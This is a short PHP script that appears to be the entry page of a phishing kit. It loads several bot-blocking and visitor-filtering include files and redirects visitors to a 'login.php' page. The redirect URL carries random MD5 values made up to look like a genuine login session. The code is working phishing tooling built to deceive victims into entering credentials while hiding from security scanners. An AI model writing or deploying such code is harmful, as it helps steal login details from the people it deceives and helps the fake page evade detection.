<?php
	require_once 'kancha.php';
        require_once 'antibots.php';
        require_once 'banned.php';
        require_once 'block.php';
        require_once 'blocker.php';
        require_once 'bots.php';
        require_once 'stop.php';
	$praga=rand();
	$praga=md5($praga);

	header("location: login.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");


?>